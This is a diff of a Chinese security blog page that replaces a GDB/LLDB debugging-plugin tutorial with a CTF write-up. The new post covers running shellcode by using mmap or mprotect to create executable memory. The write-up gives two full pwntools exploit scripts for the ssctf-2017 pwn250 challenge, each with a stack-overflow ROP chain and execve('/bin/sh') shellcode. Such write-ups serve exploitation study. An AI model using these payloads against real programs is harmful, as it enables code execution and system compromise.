@@ -4,32 +4,26 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>Using GDB/LLDB for Vulnerability Developement | H o o k | 潜心习安全</title>
+    <title>execute shellcode with mmap and mprotect | H o o k | 潜心习安全</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="hook">
     
 
     
-    <meta name="description" content="使用gdb进行漏洞挖掘">
-<meta name="keywords" content="debugger">
+    <meta name="description" content="利用mmap和mprotect来任意执行shellcode此前一直只了解了下原理，没有实际执行过，结果遇到题目后花时间去查它们的详细参数，因此这里记录总结下。">
+<meta name="keywords" content="memory-RWX">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Using GDB&#x2F;LLDB for Vulnerability Developement">
-<meta property="og:url" content="https://gloxec.github.com/posts/undefined/index.html">
+<meta property="og:title" content="execute shellcode with mmap and mprotect">
+<meta property="og:url" content="https://gloxec.github.com/2017/05/07/execute shellcode with mmap and mprotect/index.html">
 <meta property="og:site_name" content="H o o k | 潜心习安全">
-<meta property="og:description" content="使用gdb进行漏洞挖掘">
-<meta property="og:image" content="https://gloxec.github.com/images/Using%20GDB%20for%20Vulnerability%20Developement/1.jpg">
-<meta property="og:image" content="https://gloxec.github.com/images/Using%20GDB%20for%20Vulnerability%20Developement/2.jpg">
-<meta property="og:image" content="https://gloxec.github.com/images/Using%20GDB%20for%20Vulnerability%20Developement/3.jpg">
-<meta property="og:image" content="https://gloxec.github.com/images/Using%20GDB%20for%20Vulnerability%20Developement/4.jpg">
-<meta property="og:image" content="https://gloxec.github.com/images/Using%20GDB%20for%20Vulnerability%20Developement/5.jpg">
-<meta property="og:image" content="https://gloxec.github.com/images/Using%20GDB%20for%20Vulnerability%20Developement/6.jpg">
-<meta property="og:image" content="https://gloxec.github.com/images/Using%20GDB%20for%20Vulnerability%20Developement/7.jpg">
-<meta property="og:updated_time" content="2018-01-13T14:44:55.000Z">
+<meta property="og:description" content="利用mmap和mprotect来任意执行shellcode此前一直只了解了下原理，没有实际执行过，结果遇到题目后花时间去查它们的详细参数，因此这里记录总结下。">
+<meta property="og:image" content="https://gloxec.github.com/images/execute%20shellcode%20with%20mmap%20and%20mprotect/mmap.png">
+<meta property="og:updated_time" content="2018-01-13T14:37:59.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Using GDB&#x2F;LLDB for Vulnerability Developement">
-<meta name="twitter:description" content="使用gdb进行漏洞挖掘">
-<meta name="twitter:image" content="https://gloxec.github.com/images/Using%20GDB%20for%20Vulnerability%20Developement/1.jpg">
+<meta name="twitter:title" content="execute shellcode with mmap and mprotect">
+<meta name="twitter:description" content="利用mmap和mprotect来任意执行shellcode此前一直只了解了下原理，没有实际执行过，结果遇到题目后花时间去查它们的详细参数，因此这里记录总结下。">
+<meta name="twitter:image" content="https://gloxec.github.com/images/execute%20shellcode%20with%20mmap%20and%20mprotect/mmap.png">
 
     
     <link rel="alternative" href="/atom.xml" title="H o o k | 潜心习安全" type="application/atom+xml">
@@ -89,14 +83,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/posts/undefined/" title="Using GDB/LLDB for Vulnerability Developement" itemprop="url">Using GDB/LLDB for Vulnerability Developement</a>
+      <a href="/2017/05/07/execute shellcode with mmap and mprotect/" title="execute shellcode with mmap and mprotect" itemprop="url">execute shellcode with mmap and mprotect</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="hook" target="_blank" itemprop="author">hook</a>
 		
   <p class="article-time">
-    <time datetime="2017-02-05T15:21:37.000Z" itemprop="datePublished"> Published 2017-02-05</time>
+    <time datetime="2017-05-07T15:25:37.000Z" itemprop="datePublished"> Published 2017-05-07</time>
     
   </p>
 </header>
@@ -105,37 +99,28 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">Contents</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#使用gdb进行漏洞挖掘"><span class="toc-number">1.</span> <span class="toc-text">使用gdb进行漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-layout的分割窗口"><span class="toc-number">1.1.</span> <span class="toc-text">1. layout的分割窗口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-hacker插件"><span class="toc-number">1.2.</span> <span class="toc-text">2. hacker插件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#peda"><span class="toc-number">1.2.1.</span> <span class="toc-text">. peda</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GEF"><span class="toc-number">1.2.2.</span> <span class="toc-text">. GEF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libheap-查看堆信息"><span class="toc-number">1.2.3.</span> <span class="toc-text">.libheap(查看堆信息)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-调试堆等其他glibc信息时的技巧"><span class="toc-number">1.3.</span> <span class="toc-text">3.调试堆等其他glibc信息时的技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-glibc符号"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.glibc符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-glibc源码的查看"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.glibc源码的查看</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-lldb插件的补充"><span class="toc-number">1.4.</span> <span class="toc-text">2. lldb插件的补充</span></a></li></ol></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#利用mmap和mprotect来任意执行shellcode"><span class="toc-number">1.</span> <span class="toc-text">利用mmap和mprotect来任意执行shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息介绍"><span class="toc-number">1.1.</span> <span class="toc-text">信息介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#函数介绍"><span class="toc-number">1.2.</span> <span class="toc-text">函数介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mprotect"><span class="toc-number">1.2.1.</span> <span class="toc-text">. mprotect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mmap"><span class="toc-number">1.2.2.</span> <span class="toc-text">. mmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路"><span class="toc-number">1.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例"><span class="toc-number">1.4.</span> <span class="toc-text">实例</span></a></li></ol></li></ol>
 		
 		</div>
 		
-		<h1 id="使用gdb进行漏洞挖掘"><a href="#使用gdb进行漏洞挖掘" class="headerlink" title="使用gdb进行漏洞挖掘"></a>使用gdb进行漏洞挖掘</h1><a id="more"></a>
-<hr>
-<h2 id="1-layout的分割窗口"><a href="#1-layout的分割窗口" class="headerlink" title="1. layout的分割窗口"></a>1. layout的分割窗口</h2><p>layout：用于分割窗口，可以一边查看代码，一边测试。主要有以下几种用法：<br>layout src：显示源代码窗口<br>layout asm：显示汇编窗口<br>layout regs：显示源代码/汇编和寄存器窗口<br>layout split：显示源代码和汇编窗口<br>layout next：显示下一个layout<br>layout prev：显示上一个layout<br>Ctrl + L：刷新窗口<br>Ctrl + x，再按1：单窗口模式，显示一个窗口<br>Ctrl + x，再按2：双窗口模式，显示两个窗口<br>Ctrl + x，再按a：回到传统模式，即退出layout，回到执行layout之前的调试窗口。</p>
-<h2 id="2-hacker插件"><a href="#2-hacker插件" class="headerlink" title="2. hacker插件"></a>2. hacker插件</h2><h3 id="peda"><a href="#peda" class="headerlink" title=". peda"></a><1>. peda</1></h3><p>PEDA - Python Exploit Development Assistance for GDB(<a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a>)<br>可以很清晰的查看到堆栈信息，寄存器和反汇编信息<br><img src="/images/Using GDB for Vulnerability Developement/1.jpg" alt=""></p>
-<p>还有checksec, vmmap等等功能, 并且能够很方便的寻找用于ROP攻击的Gadget指令。</p>
-<h3 id="GEF"><a href="#GEF" class="headerlink" title=". GEF"></a><2>. GEF</2></h3><p>GDB Enhanced Features(<a href="https://github.com/hugsy/gef" target="_blank" rel="noopener">https://github.com/hugsy/gef</a>)<br>可以说是peda的增强版，因为它支持更多的架构(ARM, MIPS, POWERPC…)，和更加强大的模块,并且和ida联动。<br><img src="/images/Using GDB for Vulnerability Developement/2.jpg" alt=""><br>可以动态生成指定架构的shellcode<br><img src="/images/Using GDB for Vulnerability Developement/3.jpg" alt=""><br>查看堆内存信息<br><img src="/images/Using GDB for Vulnerability Developement/4.jpg" alt=""></p>
-<h3 id="libheap-查看堆信息"><a href="#libheap-查看堆信息" class="headerlink" title=".libheap(查看堆信息)"></a><3>.libheap(查看堆信息)</3></h3><p>(<a href="https://github.com/cloudburst/libheap" target="_blank" rel="noopener">https://github.com/cloudburst/libheap</a>)<br>(gdb) python from libheap import *<br>(gdb) heap -h<br>==================== Heap Dump=========================<br>Options:<br>  -a 0x1234 指定arena地址<br>  -b        输出压缩的bin列表(只是空闲数据块)<br>  -c        输出压缩的arena列表(所有数据块)<br>  -f [#]    输出所有的fast bin，或独立的fast bin<br>  -l        输出arena 中所有数据块的flat列表<br>  -s [#]    输出所有的small bin，或独立的small bin</p>
-<p>(gdb) heap -f<br>==================== HeapDump=========================<br>[ fb  0 ] 0xf2f3a8 -&gt; [0x0804b000 ] (16)</p>
-<p>[ fb  1 ] 0xf2f3ac -&gt; [0x00000000 ]</p>
-<p>[ fb  2 ] 0xf2f3b0 -&gt; [0x00000000 ]</p>
-<p>[ fb  3 ] 0xf2f3b4 -&gt; [0x00000000 ]</p>
-<p>[ fb  4 ] 0xf2f3b8 -&gt; [0x00000000 ]</p>
-<p>[ fb  5 ] 0xf2f3bc -&gt; [0x00000000 ]</p>
-<p>[ fb  6 ] 0xf2f3c0 -&gt; [0x00000000 ]</p>
-<p>[ fb  7 ] 0xf2f3c4 -&gt; [0x00000000 ]</p>
-<p>[ fb  8 ] 0xf2f3c8 -&gt; [0x00000000 ]</p>
-<p>[ fb  9 ] 0xf2f3cc -&gt; [0x00000000 ]</p>
-<h2 id="3-调试堆等其他glibc信息时的技巧"><a href="#3-调试堆等其他glibc信息时的技巧" class="headerlink" title="3.调试堆等其他glibc信息时的技巧"></a>3.调试堆等其他glibc信息时的技巧</h2><h3 id="1-glibc符号"><a href="#1-glibc符号" class="headerlink" title="1.glibc符号"></a>1.glibc符号</h3><p>在使用上述工具调试堆信息时，发现gdb并不能打印main_arena信息，原因在于linux为了系统安全，将release版glibc中的符号裁剪掉了，所以第一件事先来恢复符号表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libc6-dbg</span><br></pre></td></tr></table></figure></p>
-<p>这样将会下载debug版的glibc放在/usr/lib/debug/目录下<br>编译程序时使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g main.c -o main -Wl,-rpath=/usr/lib/debug/</span><br></pre></td></tr></table></figure></p>
-<p>gdb调试时发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) set verbose on</span><br><span class="line">(gdb) run</span><br><span class="line">Starting program: /opt/a.out </span><br><span class="line">Reading symbols from /lib64/ld-linux-x86-64.so.2...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/ld-2.23.so...done.</span><br><span class="line">done.</span><br><span class="line">Reading symbols from system-supplied DSO at 0x7ffff7ffa000...(no debugging symbols found)...done.</span><br><span class="line">Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.23.so...done.</span><br></pre></td></tr></table></figure></p>
-<p>在载入libc.so.6等glibc库时，成功从debug目录载入了符号表,再用gdb去调试跟踪malloc等函数时，会发现可以顺利进入glibc的代码跟踪下去。</p>
-<h3 id="2-glibc源码的查看"><a href="#2-glibc源码的查看" class="headerlink" title="2.glibc源码的查看"></a>2.glibc源码的查看</h3><p>像自己编写的程序因为有源代码，所以gcc -g后在gdb中list是能看到源码信息的，但是，如果想一路跟踪到glibc中，并且实时查看代码的话就必须要获取glibc源码了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get source libc6-dev</span><br></pre></td></tr></table></figure></p>
-<p>这样在调试时，gdb指定目录后就可以看到信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) directory /usr/src/glibc-2.23/malloc/</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/Using GDB for Vulnerability Developement/5.jpg" alt=""></p>
-<p><img src="/images/Using GDB for Vulnerability Developement/6.jpg" alt=""></p>
-<p><img src="/images/Using GDB for Vulnerability Developement/7.jpg" alt=""></p>
-<h2 id="2-lldb插件的补充"><a href="#2-lldb插件的补充" class="headerlink" title="2. lldb插件的补充"></a>2. lldb插件的补充</h2><p>这里新添加下两个不错的插件，voltron &amp; lisa。一个拥有舒服的ui界面，一个简洁但又拥有实用功能的插件。<br>voltron(<a href="https://github.com/snare/voltron/" target="_blank" rel="noopener">https://github.com/snare/voltron/</a>)<br>lisa(<a href="https://github.com/ant4g0nist/lisa.py" target="_blank" rel="noopener">https://github.com/ant4g0nist/lisa.py</a>)</p>
+		<h1 id="利用mmap和mprotect来任意执行shellcode"><a href="#利用mmap和mprotect来任意执行shellcode" class="headerlink" title="利用mmap和mprotect来任意执行shellcode"></a>利用mmap和mprotect来任意执行shellcode</h1><p>此前一直只了解了下原理，没有实际执行过，结果遇到题目后花时间去查它们的详细参数，因此这里记录总结下。</p>
+<a id="more"></a>
+<blockquote>
+<ul>
+<li>by hook</li>
+</ul>
+</blockquote>
+<h2 id="信息介绍"><a href="#信息介绍" class="headerlink" title="信息介绍"></a>信息介绍</h2><p>现在程序基本都是开了对堆栈不可执行选项，但msf一堆优秀的shellcode不能拿来用是件多么痛苦的事情。<br>这里可以用mmap()或者mprotect函数来构造出我们须要权限的segment。</p>
+<h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="mprotect"><a href="#mprotect" class="headerlink" title=". mprotect"></a><1>. mprotect</1></h3><p>int mprotect(const void *start, size_t len, int prot);<br>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p>
+<h3 id="mmap"><a href="#mmap" class="headerlink" title=". mmap"></a><2>. mmap</2></h3><p>void<em> mmap(void</em> start,size_t length,int prot,int flags,int fd,off_t offset);<br>mmap()函数把指定或随机分配的地址内存，以prot权限映射到自start开始的，长度为length，而且为PAGE_SIZE单位的地址。</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p><1>. 将shellcode写进一段具有可写权限的段里，然后用mprotect将对应的段修改为可执行，再跳到布置好的shellcode里。</1></p>
+<p><2>. 用mmap获取一段rwx权限的内存，映射到指定地址处，然后将shellcode写入映射好的内容存里，接着跳入布置好的shellcode中。</2></p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><a href="https://github.com/gloxec/record/blob/master/ssctf_2017/pwn250" target="_blank" rel="noopener">ssctf-2017 pwn250</a><br>就拿这这个来练习下mprotect&amp;mmap:</p>
+<p>mprotect:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span><br><span class="line">shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span><br><span class="line">shellcode += &quot;\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">bssAddr = 0x080ec000</span><br><span class="line">mprotectAddr = 0x0806e070</span><br><span class="line">readAddr = 0x0806d510</span><br><span class="line"></span><br><span class="line">p = process(&apos;./250&apos;)</span><br><span class="line">#p = remote(&apos;60.191.205.81&apos;, 2017)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p.recvuntil(&apos;Size]&apos;)</span><br><span class="line">p.sendline(&apos;102&apos;)</span><br><span class="line">p.recvuntil(&apos;Data]&apos;)</span><br><span class="line"></span><br><span class="line">pppr = 0x080ad715</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*62+p32(mprotectAddr) + p32(pppr) + p32(bssAddr) + p32(0x1000) + p32(7)</span><br><span class="line">payload += p32(readAddr) + p32(bssAddr) + p32(0) + p32(bssAddr) + p32(len(shellcode)+1)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>mmap:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span><br><span class="line">shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span><br><span class="line">shellcode += &quot;\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">segAddr = 0xbeef0000</span><br><span class="line">mmapAddr = 0x0806DF70 </span><br><span class="line">mainAddr = 0x08048886</span><br><span class="line">readAddr = 0x0806d510</span><br><span class="line"></span><br><span class="line">p = process(&apos;./250&apos;)</span><br><span class="line">#p = remote(&apos;60.191.205.81&apos;, 2017)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">p.recvuntil(&apos;Size]&apos;)</span><br><span class="line">p.sendline(&apos;94&apos;)</span><br><span class="line">p.recvuntil(&apos;Data]&apos;)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*62+p32(mmapAddr) + p32(mainAddr) + p32(segAddr) + p32(1024) + p32(7) + p32(34) + p32(0) + p32(0)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Size]&apos;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(&apos;82&apos;)</span><br><span class="line">p.recvuntil(&apos;Data]&apos;)</span><br><span class="line">payload2 = &apos;a&apos;*62+p32(readAddr) + p32(segAddr) + p32(0) + p32(segAddr) + p32(1024)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这里拿mmap后的内存看一下,可以发现被映射成rwx的内存和shellcode的成功执行。<br><img src="/images/execute shellcode with mmap and mprotect/mmap.png" alt=""></p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -149,7 +134,7 @@
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/debugger/">debugger</a>
+  <span></span> <a href="/tags/memory-RWX/">memory-RWX</a>
   </div>
 
 </div>
@@ -158,7 +143,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="https://gloxec.github.com/posts/undefined/" data-title="Using GDB/LLDB for Vulnerability Developement | H o o k | 潜心习安全" data-tsina="" class="share clearfix">
+	  <div data-url="https://gloxec.github.com/2017/05/07/execute shellcode with mmap and mprotect/" data-title="execute shellcode with mmap and mprotect | H o o k | 潜心习安全" data-tsina="" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -172,13 +157,21 @@
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/posts/undefined/" title="exploit without info leak">
+ <a href="/2017/05/16/Reverse Engineer a stripped binary/" title="Reverse Engineer a stripped binary">
   <strong>上一篇：</strong><br/>
   <span>
-  exploit without info leak</span>
+  Reverse Engineer a stripped binary</span>
 </a>
 </div>
 
+
+<div class="next">
+<a href="/2017/05/04/operation not permitted with root/"  title="operation not permitted with root">
+ <strong>下一篇：</strong><br/> 
+ <span>operation not permitted with root
+</span>
+</a>
+</div>
 
 </nav>
 
@@ -205,7 +198,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">Contents</strong>
  
- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#使用gdb进行漏洞挖掘"><span class="toc-number">1.</span> <span class="toc-text">使用gdb进行漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-layout的分割窗口"><span class="toc-number">1.1.</span> <span class="toc-text">1. layout的分割窗口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-hacker插件"><span class="toc-number">1.2.</span> <span class="toc-text">2. hacker插件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#peda"><span class="toc-number">1.2.1.</span> <span class="toc-text">. peda</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GEF"><span class="toc-number">1.2.2.</span> <span class="toc-text">. GEF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libheap-查看堆信息"><span class="toc-number">1.2.3.</span> <span class="toc-text">.libheap(查看堆信息)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-调试堆等其他glibc信息时的技巧"><span class="toc-number">1.3.</span> <span class="toc-text">3.调试堆等其他glibc信息时的技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-glibc符号"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.glibc符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-glibc源码的查看"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.glibc源码的查看</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-lldb插件的补充"><span class="toc-number">1.4.</span> <span class="toc-text">2. lldb插件的补充</span></a></li></ol></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#利用mmap和mprotect来任意执行shellcode"><span class="toc-number">1.</span> <span class="toc-text">利用mmap和mprotect来任意执行shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息介绍"><span class="toc-number">1.1.</span> <span class="toc-text">信息介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#函数介绍"><span class="toc-number">1.2.</span> <span class="toc-text">函数介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mprotect"><span class="toc-number">1.2.1.</span> <span class="toc-text">. mprotect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mmap"><span class="toc-number">1.2.2.</span> <span class="toc-text">. mmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路"><span class="toc-number">1.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例"><span class="toc-number">1.4.</span> <span class="toc-text">实例</span></a></li></ol></li></ol>
  
   </div>
 
